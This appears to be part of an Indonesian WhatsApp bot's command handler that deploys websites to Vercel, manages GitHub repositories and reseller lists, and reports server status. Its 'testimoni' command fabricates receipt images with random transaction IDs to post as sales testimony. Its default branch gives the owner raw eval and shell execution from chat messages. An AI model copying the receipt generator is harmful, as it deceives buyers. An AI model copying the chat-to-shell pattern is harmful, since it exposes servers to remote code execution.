  if (!isCreator && !isSellerWeb) return m.reply('Fitur Khusus `Reseller Website`')
  if (!text) return m.reply('Penggunaan: .createweb <namaWeb>')
  if (!qmsg || !/zip|html/.test(qmsg.mimetype)) return m.reply('Reply file .zip atau .html')

  const webName = text.trim().toLowerCase().replace(/[^a-z0-9-_]/g, '')
  const domainCheckUrl = `https://${webName}.vercel.app`

  try {
    const check = await fetch(domainCheckUrl)
    if (check.status === 200) return m.reply(`❌ Nama web *${webName}* sudah digunakan. Silakan gunakan nama lain.`)
  } catch (e) {}

  const quotedFile = await ghazoofc.downloadMediaMessage(qmsg)
  const filesToUpload = []

  if (qmsg.mimetype.includes('zip')) {
    const unzipper = require('unzipper')
    const zipBuffer = Buffer.from(quotedFile)
    const directory = await unzipper.Open.buffer(zipBuffer)

    for (const file of directory.files) {
      if (file.type === 'File') {
        const content = await file.buffer()
        const filePath = file.path.replace(/^\/+/, '').replace(/\\/g, '/')
        filesToUpload.push({
          file: filePath,
          data: content.toString('base64'),
          encoding: 'base64'
        })
      }
    }

    if (!filesToUpload.some(x => x.file.toLowerCase().endsWith('index.html'))) {
      return m.reply('File index.html tidak ditemukan dalam struktur ZIP.')
    }

  } else if (qmsg.mimetype.includes('html')) {
    filesToUpload.push({
      file: 'index.html',
      data: Buffer.from(quotedFile).toString('base64'),
      encoding: 'base64'
    })
  } else {
    return m.reply('File tidak dikenali. Kirim file .zip atau .html.')
  }

  const headers = {
    Authorization: `Bearer ${global.vercelToken}`,
    'Content-Type': 'application/json'
  }

  await fetch('https://api.vercel.com/v9/projects', {
    method: 'POST',
    headers,
    body: JSON.stringify({ name: webName })
  }).catch(() => {})

  const deployRes = await fetch('https://api.vercel.com/v13/deployments', {
    method: 'POST',
    headers,
    body: JSON.stringify({
      name: webName,
      project: webName,
      files: filesToUpload,
      projectSettings: { framework: null }
    })
  })

  const deployData = await deployRes.json().catch(() => null)
  if (!deployData || !deployData.url) {
    console.log('Deploy Error:', deployData)
    return m.reply(`Gagal deploy ke Vercel:\n${JSON.stringify(deployData)}`)
  }

  m.reply(`✅ Website berhasil dibuat!\n\n🌐 URL: https://${webName}.vercel.app`)
}
break
case "addsellerweb": { 
    if (!isCreator) return reply("❗ *Access Denied*\nFitur Only `Owner`")
    // Ketika Ada Orang Lain/ Selain Owner Yang Mengetik Command Ini Maka Bot Tidak Akan Merespon Walau Menggunakan Mode Public Dan Ini Akan Mengurangi Spam
    if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285134031285`)
   let prrkek = q.split("|")[0].replace(/[^0-9]/g, '')
    let ceknya = await ghazoofc.onWhatsApp(prrkek) // Mengecek Apkah Nomor ${prrkek} Terdaftar Di WhatsApp 
    if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
    swebnumber.push(prrkek)
    fs.writeFileSync("./database/sellerweb.json", JSON.stringify(swebnumber))
    m.reply(`Successfully Added ${prrkek} To Seller Web`)
}
break
//════════════════════════════════════════════════//
case "delsellerweb": {
    if (!isCreator) return reply("❗ *Access Denied*\nFitur Only `Owner`")
    // Ketika Ada Orang Lain/ Selain Owner Yang Mengetik Command Ini Maka Bot Tidak Akan Merespon Walau Menggunakan Mode Public Dan Ini Akan Mengurangi Spam
    if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285659202292`)
    let ya = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
    let unp = swebnumber.indexOf(ya)
    swebnumber.splice(unp, 1)
    fs.writeFileSync("./database/sellerweb.json", JSON.stringify(swebnumber))
    m.reply(`Successfully Removed ${ya} From Seller Web`)
}
break
//════════════════════════════════════════════════//
case "listsellerweb": {
  if (!isCreator) return reply("❗ *Access Denied*\nFitur Only `Owner`")
  let data = fs.readFileSync("./database/sellerweb.json", 'utf8')
  let json = JSON.parse(data)
  let tekt = "List of Seller Web:\n"
  json.forEach((item, index) => {
    tekt += `\`${index + 1}. ${item.replace(/@s\.whatsapp\.net/g, '')}\`\n`
  })
  m.reply(tekt)
}
break
case "addsellersc": { 
    if (!isCreator) return reply("❗ *Access Denied*\nFitur Only `Owner`")
    // Ketika Ada Orang Lain/ Selain Owner Yang Mengetik Command Ini Maka Bot Tidak Akan Merespon Walau Menggunakan Mode Public Dan Ini Akan Mengurangi Spam
    if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285134031285`)
   let prrkek = q.split("|")[0].replace(/[^0-9]/g, '')
    let ceknya = await ghazoofc.onWhatsApp(prrkek) // Mengecek Apkah Nomor ${prrkek} Terdaftar Di WhatsApp 
    if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
    sscnumber.push(prrkek)
    fs.writeFileSync("./database/sellersc.json", JSON.stringify(sscnumber))
    m.reply(`Successfully Added ${prrkek} To Seller Script`)
}
break
//════════════════════════════════════════════════//
case "delsellersc": {
    if (!isCreator) return reply("❗ *Access Denied*\nFitur Only `Owner`")
    // Ketika Ada Orang Lain/ Selain Owner Yang Mengetik Command Ini Maka Bot Tidak Akan Merespon Walau Menggunakan Mode Public Dan Ini Akan Mengurangi Spam
    if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285134031285`)
    let ya = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
    let unp = sscnumber.indexOf(ya)
    sscnumber.splice(unp, 1)
    fs.writeFileSync("./database/sellersc.json", JSON.stringify(sscnumber))
    m.reply(`Successfully Removed ${ya} From Seller Script`)
}
break
//════════════════════════════════════════════════//
case "listsellersc": {
  if (!isCreator) return reply("❗ *Access Denied*\nFitur Only `Owner`")
  let data = fs.readFileSync("./database/sellersc.json", 'utf8')
  let json = JSON.parse(data)
  let tekt = "List of Seller Script:\n"
  json.forEach((item, index) => {
    tekt += `\`${index + 1}. ${item.replace(/@s\.whatsapp\.net/g, '')}\`\n`
  })
  m.reply(tekt)
}
break
case 'info': {
  const name = pushname || 'No Name';
  const senderNumber = m.sender.split('@')[0];

  const iscreator = isCreator ? '☑️ Creator Bot' : '';
  const issellerweb = isSellerWeb ? '☑️ Seller Web' : '';
  const issellersc = isSellerSc ? '☑️ Seller Sc' : '';
  const status = isCreator || isSellerWeb || isSellerSc
     ? [iscreator, issellerweb, issellersc].filter(v => v).join(' ')
    : '❌ Free User';

  m.reply(
`╭───⭓ *USER INFO*
│• 🪪 *Name:* ${name}
│• ☎️ *No:* ${senderNumber}
│• 🧩 *Status:*
│  ${status}
╰───────────────⭓`
  );
}
break;
case 'cweb3':
case 'createweb3': {
  if (!isCreator && !isSellerWeb) return m.reply('Fitur ini hanya untuk Creator.')
  if (!text) return m.reply('Contoh: .createweb mywebsite')
  if (!quoted || quoted.mtype !== 'documentMessage') return m.reply('Reply dokumen HTML-nya!')

  const webName = text.trim().toLowerCase().replace(/\s+/g, '-')
  const mime = quoted?.msg?.mimetype || quoted?.mimetype
  if (!mime || !mime.includes('html')) return m.reply('File harus berupa HTML!')

  m.reply(`Membuat repository dan meng-upload file...`)

  // Ambil buffer file HTML
  const buffer = await quoted.download()
  const fileContent = buffer.toString()

  // 1. Buat repository GitHub
  const createRepo = await fetch(`https://api.github.com/user/repos`, {
    method: 'POST',
    headers: {
      Authorization: `token ${global.githubToken}`,
      'Content-Type': 'application/json',
      'User-Agent': 'Bot'
    },
    body: JSON.stringify({
      name: webName,
      auto_init: true,
      private: false
    })
  })

  const repoResult = await createRepo.json()
  if (!repoResult?.name) return m.reply(`Gagal membuat repo: ${JSON.stringify(repoResult)}`)

  // 2. Upload file index.html ke repo
  const uploadFile = await fetch(`https://api.github.com/repos/${global.githubUsername}/${webName}/contents/index.html`, {
    method: 'PUT',
    headers: {
      Authorization: `token ${global.githubToken}`,
      'Content-Type': 'application/json',
      'User-Agent': 'Bot'
    },
    body: JSON.stringify({
      message: 'add index.html',
      content: Buffer.from(fileContent).toString('base64')
    })
  })

  const uploadResult = await uploadFile.json()
  if (!uploadResult?.content?.name) return m.reply(`Gagal upload file: ${JSON.stringify(uploadResult)}`)

  // 3. Deploy ke Vercel
 const vercelDeploy = await fetch(`https://api.vercel.com/v13/deployments`, {
  method: 'POST',
  headers: {
    Authorization: `Bearer ${global.vercelToken}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    name: webName,
    files: [
      {
        file: 'index.html',
        data: Buffer.from(fileContent).toString('base64'),
        encoding: 'base64'
      }
    ],
    projectSettings: {
      framework: null
    }
  })
})

  const vercelResult = await vercelDeploy.json()
  if (!vercelResult?.url) return m.reply(`Gagal deploy ke Vercel: ${JSON.stringify(vercelResult)}`)

  m.reply(`Sukses! Website kamu telah dibuat dan bisa diakses di:\n\nhttps://${vercelResult.url}`)
}
break
case 'owner': {
        try {
        let vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${global.ownername}\nTEL;type=CELL;type=VOICE;waid=${global.ownernumber}:+${global.ownernumber}\nEND:VCARD`;
        let quotedMessage = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Kontak Owner Kami`,jpegThumbnail: ""}}}
        await ghazoofc.sendMessage(m.chat, { contacts: { displayName: "keel Official", contacts: [{ vcard }] } }, { quoted: quotedMessage });
    } catch (error) {
        console.error("Error saat mengirim kontak developer:", error);
    }
}
break
case 'donasjehdhdhi': {
  const teks = `
* DONASI / DUKUNG BOT*

_"Perumpamaan (nafkah yang dikeluarkan oleh) orang-orang yang menafkahkan hartanya di jalan Allah seperti sebutir biji yang menumbuhkan tujuh bulir, pada tiap-tiap bulir: seratus biji. Allah melipatgandakan (ganjaran) bagi siapa yang Dia kehendaki."_ 
*(QS. Al-Baqarah: 261)*

Dengan berdonasi, kamu mendukung developer agar aktif mengembangkan fitur-fitur bermanfaat.

Jika kamu merasa bot ini membantu, pertimbangkan untuk berdonasi seikhlasnya.

*Metode Donasi:*
� DANA/OVO/GOPAY/QRIS
wa.me/6285134031285

Terima kasih atas dukunganmu!
  `.trim();

  m.reply(teks);
}
break;
case 'addrepo': {
  if (!isCreator) return m.reply("❗ *Access Denied*\nFitur Only `Owner`");

  if (!text.includes("|")) return m.reply("❌ Format salah!\nGunakan: .addrepo <nama>|<deskripsi>|<private/public>");

  const [nama, deskripsi, privasi] = text.split("|").map(a => a.trim());
  if (!nama || !deskripsi || !privasi) return m.reply("⚠️ Format tidak lengkap!");

  const isPrivate = privasi.toLowerCase() === 'private';

  const fetch = require("node-fetch");
  const res = await fetch(`https://api.github.com/user/repos`, {
    method: "POST",
    headers: {
      "Authorization": `token ${global.githubToken}`,
      "Accept": "application/vnd.github+json"
    },
    body: JSON.stringify({
      name: nama,
      description: deskripsi,
      private: isPrivate
    })
  });

  const data = await res.json();

  if (res.ok) {
    m.reply(`✅ *Repository berhasil dibuat!*\n\n📦 Nama: ${data.name}\n🔒 Private: ${data.private}\n🔗 URL: ${data.html_url}`);
  } else {
    m.reply(`❌ Gagal membuat repository.\n\n${JSON.stringify(data, null, 2)}`);
  }
}
break;
case 'checkrepo': {
  if (!isCreator) return m.reply("❗ *Access Denied*\nFitur Only `Owner`");
  if (!text) return m.reply("⚠️ Masukkan nama repository!\nContoh: .checkrepo my-repo");

  const fetch = require("node-fetch");
  try {
    const repoName = text.trim();

    // Ambil info repo
    const resInfo = await fetch(`https://api.github.com/repos/${global.githubUsername}/${repoName}`, {
      headers: {
        "Authorization": `token ${global.githubToken}`,
        "Accept": "application/vnd.github+json"
      }
    });

    const repoInfo = await resInfo.json();
    if (!resInfo.ok) {
      return m.reply(`❌ Repository tidak ditemukan!\n\n${JSON.stringify(repoInfo, null, 2)}`);
    }

    // Ambil daftar file
    const resContent = await fetch(`https://api.github.com/repos/${global.githubUsername}/${repoName}/contents`, {
      headers: {
        "Authorization": `token ${global.githubToken}`,
        "Accept": "application/vnd.github+json"
      }
    });

    const contents = await resContent.json();
    if (!Array.isArray(contents)) {
      return m.reply(`❌ Gagal mengambil konten repository.`);
    }

    let listFiles = contents.map(v => `📄 ${v.name}`).join("\n");
    let total = contents.length;
    let status = repoInfo.private ? "🔒 Private" : "🌐 Public";
    let createdAt = new Date(repoInfo.created_at).toLocaleString('id-ID');

    m.reply(`*📦 Info Repository*\n\n` +
            `• Nama: ${repoInfo.name}\n` +
            `• Status: ${status}\n` +
            `• Dibuat: ${createdAt}\n` +
            `• Jumlah File: ${total}\n\n` +
            `*📁 File:*\n${listFiles}`);
  } catch (e) {
    console.error(e);
    m.reply("❌ Terjadi kesalahan saat memeriksa repository.");
  }
}
break;
case 'delrepo': {
  if (!isCreator) return m.reply("❗ *Access Denied*\nFitur Only `Owner`");
  if (!text) return m.reply("❌ *Format salah!*\nGunakan: .delrepo <nama_repository>");

  const fetch = require("node-fetch");
  const repoName = text.trim();
  const username = global.githubUsername; // pastikan ini diset di settings.js

  try {
    const res = await fetch(`https://api.github.com/repos/${username}/${repoName}`, {
      method: "DELETE",
      headers: {
        "Authorization": `token ${global.githubToken}`,
        "Accept": "application/vnd.github+json"
      }
    });

    if (res.status === 204) {
      m.reply(`✅ Repository *${repoName}* berhasil dihapus.`);
    } else if (res.status === 404) {
      m.reply(`❌ Repository *${repoName}* tidak ditemukan.`);
    } else {
      const error = await res.json();
      console.log(error);
      m.reply("❌ Gagal menghapus repository.");
    }
  } catch (err) {
    console.error(err);
    m.reply("❌ Terjadi kesalahan saat menghapus repository.");
  }
}
break;
case 'listrepo': {
  if (!isCreator) return m.reply("❗ *Access Denied*\nFitur Only `Owner`");

  
  try {
    const res = await fetch(`https://api.github.com/user/repos`, {
      headers: {
        "Authorization": `token ${global.githubToken}`,
        "Accept": "application/vnd.github+json"
      }
    });
    const data = await res.json();

    if (!Array.isArray(data)) return m.reply("❌ Gagal mengambil repository!");

    if (data.length === 0) return m.reply("ℹ️ Belum ada repository.");

    const list = data.map((repo, i) => 
      `*${i + 1}. ${repo.name}*\n> ${repo.private ? '🔒 Private' : '🌐 Public'}\n> ${repo.html_url}`
    ).join("\n\n");

    m.reply(`📁 *List Repository GitHub:*\n\n${list}`);
  } catch (err) {
    console.error(err);
    m.reply("❌ Terjadi kesalahan saat mengambil data.");
  }
}
break;
case 'testi':
case 'testimoni': {
  if (!isCreator) return m.reply("❗ *Access Denied*\nFitur Only `Owner`")
  if (!text) return m.reply("❌ *Format salah!*\nGunakan: .testimoni barang|harga");

  let [barang, harga] = text.split("|");
  if (!barang || !harga) return m.reply("⚠️ *Format tidak lengkap!*");

  m.reply(`*Terimakasih Telah Berbelanja*\n\n> Pesanan Anda telah masuk ke dalam testimoni kami\n\n\`[ CHANNEL TESTI ]\`\n${global.link}`);

  const { createCanvas, loadImage } = require('canvas');
  const fs = require('fs');
  const tanggalWaktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  const idTransaksi = `TRX${Math.floor(1000000 + Math.random() * 9000000)}`;
  const canvasWidth = 400, canvasHeight = 600;
  const canvas = createCanvas(canvasWidth, canvasHeight);
  const ctx = canvas.getContext('2d');

  // Background putih
  ctx.fillStyle = "#fff";
  ctx.fillRect(0, 0, canvasWidth, canvasHeight);

  // Header
  ctx.fillStyle = "#000";
  ctx.font = "bold 24px Arial";
  ctx.textAlign = "center";
  ctx.fillText("TRANSAKSI BERHASIL", canvasWidth / 2, 40);
  ctx.font = "16px Arial";
  ctx.fillText(tanggalWaktu + ' WIB', canvasWidth / 2, 70);

  // Detail kiri
  ctx.textAlign = "left";
  ctx.font = "16px Arial";
  ctx.fillText(`ID Transaksi: ${idTransaksi}`, 20, 130);
  ctx.fillText(`Barang: ${barang}`, 20, 160);
  ctx.fillText(`Harga: Rp${parseInt(harga.replace(/\D/g, '')).toLocaleString()}`, 20, 190);
  ctx.fillText(`Status: Berhasil`, 20, 220);

  // Ucapan
  ctx.textAlign = "center";
  ctx.font = "bold 16px Arial";
  ctx.fillText("Thx Buy Ghazo Official", canvasWidth / 2, 300);
  /*ctx.fillText("ERIZA OFFICIAL", canvasWidth / 2, 330);*/

  let bottomImagePath = null;

  try {
    // Logo toko
    const logoURL = 'https://files.catbox.moe/btyuem.png';
    const logo = await loadImage(logoURL);
    ctx.drawImage(logo, canvasWidth - 140, 120, 100, 100);

    // Download gambar dari quoted jika ada
    if (m.quoted && (m.quoted.mtype === 'imageMessage' || m.quoted.mtype === 'image')) {
      const quotedImg = await m.quoted.download();
      bottomImagePath = './session/testi-image.jpg';
      fs.writeFileSync(bottomImagePath, quotedImg);
    }

    // Tambahkan gambar bawah jika ada
    if (bottomImagePath && fs.existsSync(bottomImagePath)) {
      const bottomImage = await loadImage(bottomImagePath);
      const size = 270; // Ukuran 1:1 dan tidak menyentuh sudut
const x = (canvasWidth - size) / 2;
const y = canvasHeight - size - 20;
ctx.drawImage(bottomImage, x, y, size, size);
    }
  } catch (e) {
    console.log("Gagal memuat gambar:", e.message);
  }

  // Simpan hasil canvas
  const buffer = canvas.toBuffer("image/png");
  const filePath = "./session/testimoni.png";
  fs.writeFileSync(filePath, buffer);

  const caption = `𝗗𝗢𝗡𝗘 𝗧𝗥𝗫 𝗕𝗬 *ghazo*\n_#AllTrxNoReff_\n\n▬▬▬▬ ▬▬▬▬ ▬▬▬▬\n*[ 📦 ]* *Produk/Jasa :* ${barang}\n*[ 📦 ]* *Harga :* Rp${parseInt(harga.replace(/\D/g, '')).toLocaleString()}\n*[ 📦 ]* *Toko :* ghazo Ofc\n*[ 📦 ]* *Status :* Sukses\n▬▬▬▬ ▬▬▬▬ ▬▬▬▬\n> ${tanggalWaktu} WIB\n\n\`CHANNEL TESTI\`\nNot_Found\n\n\`keel GROUP\`\nt.me/Ghazotzyl\n\n_© 2025 - Ghazo_`;

  // Kirim ke Channel
  const channelID = global.link;
  await ghazoofc.sendMessage(channelID, { image: { url: filePath }, caption });

  // Kirim juga ke status (optional, bisa hapus bagian ini kalau tidak dipakai)
  await ghazoofc.sendMessage("status@broadcast", {
    image: fs.readFileSync(filePath),
    caption: "Testimoni Ghazo Official"
  });

  // Hapus file sementara
  fs.unlinkSync(filePath);
  if (bottomImagePath && fs.existsSync(bottomImagePath)) {
    fs.unlinkSync(bottomImagePath);
  }
}
break;
case 'ping':{
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
                    return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, {
                    length
                }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
                        user: 0,
                        nice: 0,
                        sys: 0,
                        idle: 0,
                        irq: 0
                    }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`
m.reply(respon);
}
break
default:
if ((budy.match) && ["bot","tes"].
includes(budy)) {
let teksOn = `━ ⬢ \`BOT ACTIVE\` ⬢ ━
━━━━━━━━━━━━━━━
- ᴊɪᴋᴀ ʙᴏᴛ ᴛᴇʀʜᴜʙᴜɴɢ ᴋᴀʀᴇɴᴀ ᴋᴏᴅᴇ ᴘᴀɪʀɪɴɢ
- ᴍᴀᴋᴀ ᴀᴋᴜ ᴍᴇʀᴇɴᴜɴɢ ᴍᴇʟɪʜᴀᴛᴍᴜ ᴅᴇɴɢᴀɴ ʏᴀɴɢ ʟᴀɪɴ
━━━━━━━━━━━━━━━
Special Quotes By ghazo`
reply(teksOn)
}
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
/*if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return*/
console.log('Caught exception: ', err)
})